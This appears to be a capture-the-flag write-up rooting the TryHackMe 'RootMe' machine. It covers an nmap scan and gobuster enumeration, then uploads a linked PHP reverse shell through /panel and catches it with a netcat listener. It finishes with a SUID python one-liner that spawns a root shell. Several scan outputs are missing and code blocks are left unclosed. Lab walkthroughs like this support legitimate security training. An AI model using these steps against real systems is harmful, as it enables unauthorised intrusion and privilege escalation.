> **[Rootme](https://tryhackme.com/room/rrootme)** is a fairly simple linux box. We shall start with `nmap` scan to see the ports open on the machine. We would then use `gobuster` for directory brute force and from there we would find where you can upload a file. So we shall upload a reverse shell script which will give us the initial access on the system. Finally we shall do privilege escalation by exploiting the `SUID` of one of the files to get root privileges.

## Enumeretion

We will begin with port scanning to know which ports are open. We shall use `nmap` . We have used `-sC` for default scripts, `-sV` to enumerate all versions, `-oA` to output all format in a file called `initial` and finally it’s `IP` address. Here is the results:

```bash
└─$ nmap -sC -sV -oA initial 10.10.151.224

Well `Port 80` is open so we shall use `gobuster` for directory brute force and here is it’s results:

```bash

Well, we have a directory called `/panel` and if we go there we would see that we can upload some file. Since the website is running on `php` we need to find a `php` exploit that will give us a reverse shell.
![panel](panel.png)_panel_

## Initial access

We used the same exploit that was previously used on the [LazyAdmin](https://yrncollo.com/posts/LazyAdmin/) challenge to gain initial access. Change the `IP` and the `Port` that `netcat` will be listening from. The exploit can be found at the following GitHub repository: `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`.

```bash
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

Well we have gotten shell and we are `www-data` . So we need to upgrade our shell so that we have a stable shell.

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.4$ ^Z
zsh: suspended  nc -lvnp 9001
```

Press `Ctrl + z` to background the session then:

```bash
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9001

bash-4.4$ export TERM=xterm
bash-4.4$
```

## Privilege Escalation

After gaining access as `www-data`, we need to escalate our privileges to gain root access. We can start by searching for files with the `SUID` bit set using the following command:

```bash
find / -perm /4000 2>/dev/null

```

This will show us all the files with the SUID bit set. We can then use [GTFOBins](https://gtfobins.github.io/) to find ways to exploit these files. In this case, Python was not set correctly and we can exploit it by using this from `gtfobins`:


```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

```

Once we have a root shell, we can navigate to the `/root` directory and read the `root.txt` file to get the flag.

```
# cd /root
# ls
root.txt
# cat root.txt
THM{changed_the_flag}
#

```
> Yeah that's it... We have successfully hacked into rootme machine and if you have any questions regarding the box you can ask on the comment section. **HAPPY HACKING CHEERS** ;)
